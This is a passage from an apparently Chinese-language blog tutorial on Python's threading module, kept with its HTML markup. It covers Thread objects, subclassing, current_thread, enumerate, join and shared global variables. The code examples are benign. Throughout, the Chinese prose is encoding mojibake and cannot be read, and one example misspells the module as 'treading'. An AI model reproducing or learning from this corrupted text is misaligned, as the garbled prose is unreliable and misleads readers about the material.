¸å¿ƒæ•°å°äºä»»åŠ¡æ•°</p><p>çº¿ç¨‹ï¼š</p><blockquote><p>çº¿ç¨‹ï¼ˆè‹±è¯­ï¼šthreadï¼‰æ˜¯æ“ä½œç³»ç»Ÿèƒ½å¤Ÿè¿›è¡Œè¿ç®—è°ƒåº¦çš„æœ€å°å•ä½ã€‚å®ƒè¢«åŒ…å«åœ¨è¿›ç¨‹ä¹‹ä¸­ï¼Œæ˜¯è¿›ç¨‹ä¸­çš„å®é™…è¿ä½œå•ä½ã€‚ä¸€æ¡çº¿ç¨‹æŒ‡çš„æ˜¯è¿›ç¨‹ä¸­ä¸€ä¸ªå•ä¸€é¡ºåºçš„æ§åˆ¶æµï¼Œä¸€ä¸ªè¿›ç¨‹ä¸­å¯ä»¥å¹¶å‘å¤šä¸ªçº¿ç¨‹ï¼Œæ¯æ¡çº¿ç¨‹å¹¶è¡Œæ‰§è¡Œä¸åŒçš„ä»»åŠ¡ã€‚</p></blockquote><p>çº¿ç¨‹å‡½æ•°ä¸èƒ½æœ‰è¿”å›å€¼ï¼š</p><p>æœ‰ä»¥ä¸‹å‡ æ®µæ–‡å­—å‚è€ƒï¼šï¼ˆè™½ç„¶çœ‹å®Œè¿˜æ˜¯æœ‰ç‚¹è¿·ç³Šï¼Œä½†æ˜¯æ¯”ä¸çœ‹å¥½äº†ä¸€äº›ï¼‰</p><blockquote><p>çº¿ç¨‹çš„æ‰§è¡Œæœ¬èº«æ˜¯ä¸€ä¸ªå¼‚æ­¥è¿‡ç¨‹ï¼Œå½“çº¿ç¨‹ç»“æŸæ—¶ï¼Œç¨‹åºå·²ç»ä¸æ˜¯è°ƒç”¨å¤„çš„çŠ¶æ€äº†ã€‚</p></blockquote><blockquote><p>ä¸€èˆ¬æƒ…å†µéœ€è¦ç”¨çº¿ç¨‹çš„è¯éƒ½æ˜¯å¼‚æ­¥çš„ï¼Œå¦‚æœæ˜¯éœ€è¦ç­‰å¾…è¿”å›å€¼åšå¤„ç†çš„æƒ…å†µå¤§éƒ¨åˆ†éƒ½æ˜¯åŒæ­¥çš„ä¸éœ€è¦ç”¨åˆ°å¤šçº¿ç¨‹(é™¤éæ˜¯å“åº”å¼ï¼Œå³çº¿ç¨‹æ‰§è¡Œå®Œäº†ï¼Œç„¶åä¿ƒå‘æŸä¸ªæ–¹æ³•æ¥å¤„ç†æŸä¸ªç»“æœ)ï¼Œè¿™ç§æƒ…å†µçš„è¯æœ€å¥½æ˜¯å•ç‹¬è®¾ç½®ä¸€ä¸ªé™æ€å˜é‡æ¥è®°å½•è¿™ä¸ªå€¼ï¼Œä¸æ˜¯ç”¨è¿”å›å€¼è¿™ç§æ¦‚å¿µæ¥åšçš„ã€‚</p></blockquote><blockquote><p>è¿™æ˜¯ç›®å‰æœ€ä¸»æµçš„è·å–çº¿ç¨‹æ•°æ®çš„æ–¹æ³•ã€‚ä½¿ç”¨ Queueåº“åˆ›å»ºé˜Ÿåˆ—å®ä¾‹ï¼Œç”¨æ¥å‚¨å­˜å’Œä¼ é€’çº¿ç¨‹é—´çš„æ•°æ®ã€‚Pythonçš„é˜Ÿåˆ—æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®ä¸€ä¸ªé˜Ÿåˆ—ä¹Ÿä¸ä¼šæœ‰å†²çªã€‚Pythoné˜Ÿåˆ—æœ‰ä¸‰ç§ FIFO å…ˆè¿›å…ˆå‡ºï¼ŒFILOå…ˆè¿›åå‡ºï¼ˆç±»ä¼¼æ ˆï¼‰ï¼Œä¼˜å…ˆçº§é˜Ÿåˆ—ï¼ˆç”±å•ç‹¬çš„ä¼˜å…ˆçº§å‚æ•°å†³å®šé¡ºåºï¼‰ã€‚ä½¿ç”¨é˜Ÿåˆ—å¯ä»¥å®ç°ç®€å•ç”Ÿäº§è€… â€“ æ¶ˆè´¹è€… æ¨¡å‹</p></blockquote><h2 id="threading-æ¨¡å—">threading æ¨¡å—</h2><p>Python çš„ threading æ¨¡å—æ˜¯æ¯”è¾ƒåº•å±‚çš„æ¨¡å—ï¼Œthreadingæ¨¡å—ä¸­æœ‰ä¸€ä¸ªç±»å«åš Threadã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨ Threadç±»åˆ›å»ºä¸€ä¸ªç±»å¯¹è±¡ï¼Œå°†æ¥æˆ‘ä»¬å°±ç”¨è¿™ä¸ªå¯¹è±¡æ¥å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹ã€‚å½“æˆ‘ä»¬è°ƒç”¨è¯¥å¯¹è±¡çš„start æ–¹æ³•æ—¶ï¼Œè¯¥æ–¹æ³•ä¼šè°ƒç”¨å…¶å†…éƒ¨çš„ run æ–¹æ³•ï¼Œæ¥åˆ›å»ºä¸€ä¸ªçº¿ç¨‹</p><h2 id="ä¸¤ç§ä½¿ç”¨æ–¹æ³•">ä¸¤ç§ä½¿ç”¨æ–¹æ³•</h2><h3 id="å‡½æ•°">å‡½æ•°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():  <span class="comment"># è¿™æ˜¯ä¸€ä¸ªå‡½æ•°</span></span><br><span class="line"></span><br><span class="line">t1 = treading.Thread(target=func)</span><br><span class="line"></span><br><span class="line">t1.start()</span><br></pre></td></tr></table></figure><p>Thread ç±»åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼ˆæ³¨ï¼šè¯¥ç±»å¯¹è±¡è¦ä¼ å…¥ä¸€ä¸ª target å‚æ•°ï¼Œå†™å‡½æ•°å¼•ç”¨ï¼Œå³ï¼šå‡½æ•°åã€‚ï¼Œç„¶å t1 è°ƒç”¨å®ƒçš„ startæ–¹æ³•ï¼Œæ¥æ‰§è¡Œåˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œä¹‹å‰çš„ target ä¼ å…¥çš„å‡½æ•° funcã€‚å½“åˆ›å»º Threadæ—¶æ‰§è¡Œçš„å‡½æ•°ï¼ˆtargetä¼ å…¥çš„å‡½æ•°å¼•ç”¨ï¼‰è¿è¡Œç»“æŸï¼Œé‚£ä¹ˆæ„å‘³ç€è¿™ä¸ªå­çº¿ç¨‹ç»“æŸäº†ã€‚</p><p>ä¸»çº¿ç¨‹ç»“æŸï¼Œç¨‹åºæ‰ä¼šç»“æŸã€‚å¦‚æœä¸»çº¿ç¨‹ä¸å°å¿ƒå…ˆç»“æŸäº†ï¼Œé‚£å­çº¿ç¨‹ä¹Ÿéšä¹‹ç»“æŸï¼ˆå³ï¼šä¸»çº¿ç¨‹ç»“æŸäº†ï¼Œå­çº¿ç¨‹ä¼šéšä¹‹ç»“æŸï¼‰ã€‚ä¸€ä¸ªå­çº¿ç¨‹åœ¨è¿è¡Œæ—¶ä¼šæœ‰ä¸€äº›è‡ªå·±çš„ä¸œè¥¿ï¼Œä¸»çº¿ç¨‹æœ€åç»“æŸï¼Œä¾¿è´Ÿè´£å¸®ä»–ä»¬å›æ”¶å¤„ç†ã€‚</p><p>æ³¨ï¼štarget å‚æ•°ï¼šåªå†™å‡½æ•°åæ˜¯å‡½æ•°å¼•ç”¨ï¼Œå‡½æ•°å() æ˜¯æ‰§è¡Œå‡½æ•°ã€‚targetå‚æ•°åªèƒ½å¤Ÿä¼ å‡½æ•°åï¼Œä¸èƒ½ä¼ ç±»ã€‚</p><p>å½“è°ƒç”¨ Thread çš„æ—¶å€™ï¼Œä¸ä¼šåˆ›å»ºçº¿ç¨‹ã€‚å½“è°ƒç”¨ Threadåˆ›å»ºå‡ºæ¥çš„å®ä¾‹å¯¹è±¡çš„ startæ–¹æ³•æ—¶ï¼Œæ‰ä¼šåˆ›å»ºçº¿ç¨‹å¹¶ä½¿çº¿ç¨‹ç­‰å¾…ç³»ç»Ÿè°ƒç”¨ã€‚</p><p>å½“ Thread ç±»å¯¹è±¡è°ƒç”¨å…¶ startæ–¹æ³•æ—¶ï¼Œä¸»çº¿ç¨‹ä¼šå¼€å¯ä¸€ä¸ªå­çº¿ç¨‹ï¼Œè¯¥å­çº¿ç¨‹ä¼šç­‰å¾…ç³»ç»Ÿè°ƒç”¨ï¼Œç„¶åå»æ‰§è¡Œä¹‹å‰ç±»å¯¹è±¡ä¼ å…¥çš„å‡½æ•°å¼•ç”¨å¯¹åº”çš„å‡½æ•°ã€‚è‡³äºä»€ä¹ˆæ—¶å€™è°ƒç”¨æ˜¯éšæœºçš„ï¼Œå–å†³äºç³»ç»Ÿçš„å†…æ ¸ã€‚</p><p>ä¸»çº¿ç¨‹æ‰§è¡Œå®Œè¯¥æ‰§è¡Œçš„ä»£ç åï¼Œæ²¡æœ‰å…¶ä»–ä»£ç è¦æ‰§è¡Œæ—¶ï¼Œä¼šç­‰å¾…å­çº¿ç¨‹ç»“æŸä¹‹åå†ç»“æŸã€‚</p><p>æ³¨ï¼šå¤šçº¿ç¨‹ä¸­æ¯ä¸ªçº¿ç¨‹çš„æ‰§è¡Œé¡ºåºæ˜¯ä¸ç¡®å®šçš„ã€‚æˆ‘ä»¬æ— æ³•æ§åˆ¶çº¿ç¨‹è¢«è°ƒç”¨çš„é¡ºåºï¼Œä½†å¯ä»¥é€šè¿‡åˆ«çš„æ–¹å¼ï¼ˆæ¯”å¦‚ï¼štime.sleep()ï¼‰æ¥å½±å“çº¿ç¨‹è°ƒåº¦çš„æ–¹å¼ã€‚</p><h3 id="ç±»">ç±»</h3><p>å¦‚æœè¦ä½¿ç”¨ç±»æ—¶ï¼Œéœ€è¦ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span>(threading.Thread):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">msg = <span class="string">&quot;I&#x27;m &quot;</span> + self.name + <span class="string">&#x27; @ &#x27;</span> + <span class="built_in">str</span>(i)  <span class="comment"># name å±æ€§ä¸­ä¿å­˜çš„æ˜¯å½“å‰è¥¿å®‰æ²‰çš„åå­—</span></span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">t = MyThread()</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>å®šä¹‰ä¸€ä¸ªç±»è¿™ä¸ªç±»ç»§æ‰¿è‡ª Thread ç±»ï¼Œè¿™ä¸ªç±»å†™ä¸€ä¸ª runæ–¹æ³•ï¼ˆæœ‰é¢å¤–çš„æ–¹æ³•éšæ„ï¼Œä½†æ˜¯å¿…é¡»æœ‰ run æ–¹æ³•ï¼‰ï¼Œstart æ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨ runæ–¹æ³•ã€‚run æ–¹æ³•æ‰§è¡Œå®Œäº†ï¼Œè¿™ä¸ªçº¿ç¨‹å°±ç»“æŸäº†ã€‚</p><p>é€‚åˆäºä¸€ä¸ªçº¿ç¨‹ä¸­åšçš„äº‹æƒ…æ¯”è¾ƒå¤æ‚ï¼Œè€Œä¸”æˆ‘åˆ†æˆäº†å¤šä¸ªå‡½æ•°å»åšã€‚</p><p>ä½ å¯ä»¥åœ¨ run æ–¹æ³•ä¸­è°ƒç”¨ self.login()ã€self.register()ç­‰æ–¹æ³•æ¥ä½¿ç”¨ç±»ä¸­çš„ login å’Œ register æ–¹æ³•ã€‚</p><h1 id="å¸¸ç”¨å‡½æ•°">å¸¸ç”¨å‡½æ•°</h1><p>treading æ¨¡å—ä¸­å¸¸ç”¨å‡½æ•°æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ï¼š</p><blockquote><p>Note: While they are not listed below, the <code>camelCase</code>names used for some methods and functions in this module in the Python2.x series are still supported by this module.</p></blockquote><p>å®˜æ–¹å†™åˆ° Python 2.x ä¸­é©¼å³°å¼å†™æ³•çš„å‡½æ•°ä»è¢«æ”¯æŒï¼Œå³ï¼šPython 2.xä¸­å‡½æ•°ä¸º currentThread è¿™æ ·ï¼ŒPython 3.x åˆæ¥äº†ä¸€ç§ï¼Œä¸º current_threadè¿™æ ·ã€‚æ—¢ç„¶ç°åœ¨éƒ½ Python 3.7äº†ï¼Œæˆ‘ä»¬è¿˜æ˜¯ç”¨ä¸‹åˆ’çº¿çš„æ–°ç‰ˆå§ã€‚ï¼ˆè¯´ç€ä¸€ç‚¹ï¼Œè¿˜æœ‰ä¸€ä¸ªæ„æ€ï¼Œå°±æ˜¯çœ‹åˆ°currentThread è¿™æ ·å†™çš„å‡½æ•°ä»£ç å•¥çš„è¦è®¤è¯†ã€‚ï¼‰</p><h2 id="current_thread">current_thread</h2><p><strong>threading.current_thread()</strong> è¿”å›è°ƒç”¨å½“å‰ä»£ç çš„ Threadå¯¹è±¡ã€‚å¦‚æœè°ƒç”¨è€…æ§åˆ¶çš„çº¿ç¨‹ä¸æ˜¯é€šè¿‡ threadingæ¨¡å—åˆ›å»ºçš„ï¼Œåˆ™è¿”å›ä¸€ä¸ªåªæœ‰æœ‰é™åŠŸèƒ½çš„è™šå‡çº¿ç¨‹å¯¹è±¡ã€‚</p><h2 id="main_thread">main_thread</h2><p><strong>threading.main_thread()</strong></p><p>è¿”å›ä¸»çº¿ç¨‹å¯¹è±¡ï¼Œåœ¨æ­£å¸¸æ¡ä»¶ä¸‹ï¼Œä¸»çº¿ç¨‹æ˜¯ Pythonè§£é‡Šå™¨åˆ›å»ºå¼€å¯çš„çº¿ç¨‹ã€‚</p><h2 id="active_count">active_count</h2><p><strong>threading.active_count()</strong>è¿”å›å½“å‰æ´»ç€çš„<strong>Thread</strong>å¯¹è±¡çš„ä¸ªæ•°ã€‚è¿”å›çš„æ•°ç›®ç­‰äº<strong>enumerate()</strong>è¿”å›çš„åˆ—è¡¨çš„é•¿åº¦ï¼ˆæ‰€ä»¥å°±ä¸ç”¨éº»çƒ¦çš„ä½¿ç”¨len(threading.enumerate()) äº†ï¼‰</p><h2 id="enumerate">enumerate</h2><p><strong>threading.enumerate()</strong></p><p>è¿”å›å½“å‰æ´»ç€çš„ Thread å¯¹è±¡çš„åˆ—è¡¨ã€‚è¯¥åˆ—è¡¨åŒ…æ‹¬å®ˆæŠ¤çº¿ç¨‹ã€ç”±current_thread()åˆ›å»ºçš„è™šå‡çº¿ç¨‹å¯¹è±¡å’Œä¸»çº¿ç¨‹ã€‚å®ƒä¸åŒ…æ‹¬ç»ˆæ­¢çš„çº¿ç¨‹å’Œè¿˜æ²¡æœ‰å¼€å§‹çš„çº¿ç¨‹ã€‚</p><p>threading æ¨¡å—ä¸­æœ‰ä¸€ä¸ªenumerate()ï¼Œå®ƒçš„è¿”å›å€¼æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œè¿™ä¸ªåˆ—è¡¨ä¸­æ‹¥æœ‰å½“å‰ç¨‹åºè¿è¡Œèµ·æ¥ä¹‹åå®ƒåˆ›å»ºçš„æ‰€æœ‰çº¿ç¨‹ï¼ˆåŒ…æ‹¬å…¶ä¸»çº¿ç¨‹ã€‚ï¼‰</p><p>enumerate()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> temp <span class="keyword">in</span> names:</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(temp)</span><br><span class="line">...</span><br><span class="line">aa</span><br><span class="line">bb</span><br><span class="line">cc</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> temp <span class="keyword">in</span> <span class="built_in">enumerate</span>(names):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(temp)</span><br><span class="line">...</span><br><span class="line">(<span class="number">0</span>, <span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;bb&#x27;</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;cc&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> key,value <span class="keyword">in</span> <span class="built_in">enumerate</span>(names):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(key,value)</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span> aa</span><br><span class="line"><span class="number">1</span> bb</span><br><span class="line"><span class="number">2</span> cc</span><br></pre></td></tr></table></figure><p>é€šè¿‡ for ä¸ enumerate() è¿”å›ä¸€ä¸ªé”®å€¼å¯¹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨å†™ foræ—¶è¿›è¡Œæ‹†åŒ…ã€‚</p><p>çº¿ç¨‹çš„æ‰§è¡Œæ˜¯æ²¡æœ‰å…ˆåé¡ºåºçš„ï¼Œä¸ç¡®å®šçš„ï¼Œè¿™å–å†³äºå†…æ ¸çš„è°ƒåº¦ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test1</span>():</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-----test1-----%d----&#x27;</span> % i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test2</span>():</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-----test2-----%d----&#x27;</span> % i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">t1 = threading.Thread(target=test1)</span><br><span class="line">t2 = threading.Thread(target=test2)</span><br><span class="line"></span><br><span class="line">t1.start()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">t2.start()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(threading.<span class="built_in">enumerate</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé€šè¿‡è®©ä¸»çº¿ç¨‹ sleep ä¸€ç§’é’Ÿæ¥è¾¾åˆ°ä½¿ t1.startå¼€å¯çš„çº¿ç¨‹å…ˆæ‰§è¡Œå®Œï¼Œç„¶å t2.start å¼€å¯çš„çº¿ç¨‹å†æ‰§è¡Œå®Œï¼Œæœ€åå†æ‰§è¡Œ printçº¿ç¨‹æ•°ç›®çš„ç›®çš„ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒæ•´å¢å‡ time.sleep() åœ¨ t1.start()ã€t2.start() ä»¥åŠä»–ä»¬æ‰§è¡Œçš„å‡½æ•°ä¸­çš„ä½ç½®æ¥è°ƒæ•´æ‰“å°çº¿ç¨‹ã€‚</p><p>é€šè¿‡ä»¥ä¸‹æµ‹è¯•æˆ‘ä»¬ä¹Ÿå¯ä»¥çŸ¥é“ï¼Œçº¿ç¨‹åˆ›å»ºæ˜¯åœ¨ t1.start() çš„æ—¶å€™ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> threading</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(<span class="string">&#x27;----1----&#x27;</span>)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t1 = threading.Thread(target=test)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t1.start()</span><br><span class="line">----<span class="number">1</span>----</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ len å‡½æ•° é€šè¿‡åˆ¤æ–­ threading.enumerate()çš„é•¿åº¦ä¸ªæ•°æ¥åˆ¤æ–­æ˜¯å¦å­çº¿ç¨‹æ˜¯å¦ç»“æŸã€‚</p><h1 id="å¸¸ç”¨æ–¹æ³•">å¸¸ç”¨æ–¹æ³•</h1><p>Thread ç±»ä¸­å¸¸ç”¨æ–¹æ³•ï¼š</p><h2 id="thread">Thread()</h2><blockquote><p><code>Thread</code>(<em>group=None</em>, <em>target=None</em>,<em>name=None</em>, <em>args=()</em>, <em>kwargs={}</em>, <em>**,</em>daemon=None*)</p></blockquote><p>å¸¸ç”¨åˆ°çš„å‚æ•°ï¼š <em>target</em> ï¼šrun()æ–¹æ³•è°ƒç”¨çš„å¯¹è±¡ï¼Œå³è¯¥çº¿ç¨‹åšçš„äº‹æƒ…ï¼Œä¸€èˆ¬æˆ‘ä»¬å°±å†™ä¸€ä¸ªå‡½æ•°å</p><p><em>name</em> : çº¿ç¨‹çš„åå­—ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šè‡ªåŠ¨æ„é€ ä¸€ä¸ª â€œThread-Nâ€æ ¼å¼ï¼ˆå…¶ä¸­ N æ˜¯ä¸€ä¸ªå°çš„åè¿›åˆ¶æ•°ï¼‰çš„å”¯ä¸€çš„åå­—ã€‚</p><p><em>args</em> : ä¸€ä¸ªå‚æ•°<strong>å…ƒç»„</strong>ï¼Œç”¨æ¥å‘ targetå‚æ•°çš„å¯¹è±¡ä¼ é€’å‚æ•°</p><h2 id="run">run():</h2><p>ç”¨ä»¥è¡¨ç¤ºçº¿ç¨‹æ´»åŠ¨çš„æ–¹æ³•ï¼Œå½“çº¿ç¨‹çš„ run() æ–¹æ³•ç»“æŸæ—¶ï¼Œè¯¥çº¿ç¨‹ç»“æŸã€‚</p><h2 id="start">start():</h2><p>å¯åŠ¨çº¿ç¨‹æ´»åŠ¨ï¼Œä¸€ä¸ªçº¿ç¨‹å¯¹è±¡æœ€å¤šåªèƒ½è°ƒç”¨ä¸€æ¬¡ã€‚å®ƒä¸ºå¯¹è±¡çš„ run()æ–¹æ³•å‡†å¤‡ä¸€ä¸ªç‹¬ç«‹åˆ†ç¦»çš„æ§åˆ¶çº¿ç¨‹ã€‚</p><h2 id="jointimeoutnone">join(timeout=None)</h2><p>ç­‰å¾…è‡³çº¿ç¨‹ä¸­æ­¢ã€‚æ­¤æ–¹æ³•ä¼šé˜»å¡è°ƒç”¨çº¿ç¨‹ï¼Œç›´è‡³çº¿ç¨‹çš„ join()æ–¹æ³•è¢«è°ƒç”¨ä¸­æ­¢ï¼ˆæ­£å¸¸é€€å‡ºæˆ–è€…æŠ›å‡ºæœªå¤„ç†çš„å¼‚å¸¸æˆ–è€…æ˜¯å¯é€‰çš„è¶…æ—¶å‘ç”Ÿã€‚ï¼‰</p><p>ä¸€èˆ¬ä½¿ç”¨å®ƒæ¥é˜»å¡ä¸»çº¿ç¨‹ï¼Œç­‰å¾…å­çº¿ç¨‹ç»“æŸï¼Œç„¶åä¸»çº¿ç¨‹å»åšåé¢çš„äº‹æƒ…ã€‚</p><p>å¸¸è§çš„åœºæ™¯æ˜¯ï¼šå°†åˆ›å»ºçš„å¤šçº¿ç¨‹æ”¾åˆ°ä¸€ä¸ªåˆ—è¡¨ä¸­ï¼Œç„¶åï¼Œå½“ä½ æƒ³è¦ä¿è¯ä¸»çº¿ç¨‹åœ¨æ‰€æœ‰å­çº¿ç¨‹ç»“æŸååšä¸€äº›äº‹æƒ…æ—¶ï¼Œå°±è¦ç”¨åˆ°joinï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ foréå†å¤šçº¿ç¨‹åˆ—è¡¨ï¼Œä»è€Œé˜»å¡ä¸»çº¿ç¨‹ï¼Œç›´åˆ°æ¯ä¸ªå­çº¿ç¨‹éƒ½ç»“æŸä¹‹åï¼Œè§£å µå¡ã€‚ï¼ˆjoinæ˜¯é’ˆå¯¹å•ä¸ªçº¿ç¨‹ï¼Œæˆ‘ä»¬å¾ªç¯å°±å¯ä»¥å¯¹æ¯ä¸ªçº¿ç¨‹ä¾æ¬¡ joinï¼‰</p><h1 id="å¤šçº¿ç¨‹å…±äº«å…¨å±€å˜é‡">å¤šçº¿ç¨‹å…±äº«å…¨å±€å˜é‡</h1><p>åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­çš„æ‰€æœ‰çº¿ç¨‹å…±äº«å…¨å±€å˜é‡ï¼Œæœ‰ä¸€ä¸ªç¼ºç‚¹ï¼šçº¿ç¨‹æ˜¯å¯¹å…¨å±€å˜é‡éšæ„ä¿®æ”¹ï¼Œå¯èƒ½é€ æˆå¤šçº¿ç¨‹ä¹‹é—´å¯¹å…¨å±€å˜é‡çš„æ··ä¹±ï¼ˆå³çº¿ç¨‹éå®‰å…¨ï¼‰</p><p>å¦‚æœå¤šä¸ªçº¿ç¨‹åŒæ—¶å¯¹åŒä¸€ä¸ªå…¨å±€å˜é‡æ“ä½œï¼Œä¼šå‡ºç°èµ„æºç«äº‰é—®é¢˜ï¼Œä»è€Œæ•°æ®ç»“æœä¼šä¸æ­£ç¡®ã€‚</p><h2 id="å…¨å±€å˜é‡">å…¨å±€å˜é‡</h2><p>å¦‚æœæƒ³è¦åœ¨ä¸€ä¸ªå‡½æ•°é‡Œé¢ä¿®æ”¹å…¨å±€å˜é‡ï¼Œä¸ä¸€å®šéœ€è¦ä½¿ç”¨ globalå…³é”®å­—ã€‚</p><p>ä¸¤ç§æƒ…å†µï¼š</p><p>å¦‚æœä½ è¦ä¿®æ”¹å…¨å±€å˜é‡åœ°å€é‡Œé¢çš„å€¼ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹ã€‚ï¼ˆå½“ç„¶ï¼Œæœ‰çš„å˜é‡æ˜¯ä¸å¯ä¿®æ”¹çš„ã€‚ï¼‰</p><p>å¦‚æœä½ è¦ä¿®æ”¹å…¨å±€å˜é‡çš„æŒ‡å‘ï¼ˆå³ï¼šä½¿ç”¨åŒ…å« =åœ¨å†…çš„ä¸€ä¸²èµ‹å€¼è¿ç®—ï¼‰ï¼Œé‚£å°±ä¸èƒ½ç›´æ¥ä¿®æ”¹ï¼Œéœ€è¦ä½¿ç”¨ globalã€‚</p><p>å³ï¼š</p><p>å¦‚ä¸€ä¸ªå‡½æ•°ä¸­ï¼Œå¯¹å…¨å±€å˜é‡è¿›è¡Œä¿®æ”¹çš„æ—¶å€™ï¼Œæ˜¯å¦éœ€è¦ä½¿ç”¨globalï¼Œè¦çœ‹æ˜¯å¦å¯¹å‡½æ•°çš„æŒ‡å‘è¿›è¡Œäº†ä¿®æ”¹ã€‚</p><p>å¦‚æœä¿®æ”¹äº†æ‰§è¡Œï¼Œå³è®©å…¨å±€å˜é‡æŒ‡å‘äº†ä¸€ä¸ªæ–°çš„åœ°æ–¹ï¼Œé‚£ä¹ˆå¿…é¡»ä½¿ç”¨ globalï¼Œå¦‚æœï¼Œä»…ä»…æ˜¯ä¿®æ”¹äº†æŒ‡å‘çš„ç©ºé—´ä¸­çš„æ•°æ®ï¼Œæ­¤æ—¶ä¸å¿…ä½¿ç”¨ globalã€‚</p><p>ä¸ä¿®æ”¹ï¼Œä»…ä»…æ˜¯è·å–å…¨å±€å˜é‡ï¼Œå°±ä¸éœ€è¦ä½¿ç”¨ 